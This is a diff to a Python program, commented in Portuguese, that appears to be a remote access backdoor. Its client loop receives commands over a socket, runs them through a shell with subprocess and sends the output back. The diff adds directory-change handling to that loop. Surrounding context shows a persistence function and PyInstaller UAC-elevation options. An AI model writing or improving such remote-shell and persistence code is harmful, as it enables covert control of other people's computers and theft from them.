@@ -24,6 +24,10 @@ TEMPDIR = tempfile.gettempdir()
                         request elevation upon application restart.
   --uac-uiaccess        Using this option allows an elevated application to
                         work with Remote Desktop.
+
+
+    Mkdir touch >
+    Print stderr + stdout no lado do cliente para que no lado do servidor não trave .
 '''
 
 def persistencia():
@@ -67,9 +71,20 @@ def executa(socket):
                             if(dados == 'shell'):
                                 pass
                             else:
-                                comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
-                                retorno = comando.stdout.read() + comando.stderr.read()
-                                socket.send(retorno)
+                                if(dados.split(' ')[0] == 'cd'):
+                                    try:
+                                        pasta = (dados.split(' ')[1])
+                                        caminho = os.chdir(pasta.rstrip('\n'))
+                                        local = os.getcwd()
+                                        socket.send(local)
+                                    except Exception as e:
+                                        socket.send('Erro a trocar de diretorio -> ' + e)
+
+                                else:
+                                    comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+                                    retorno = comando.stdout.read() + comando.stderr.read()
+                                    print('enviando',retorno)
+                                    socket.send(retorno)
 
                     elif(dados=='download'):
                         pass
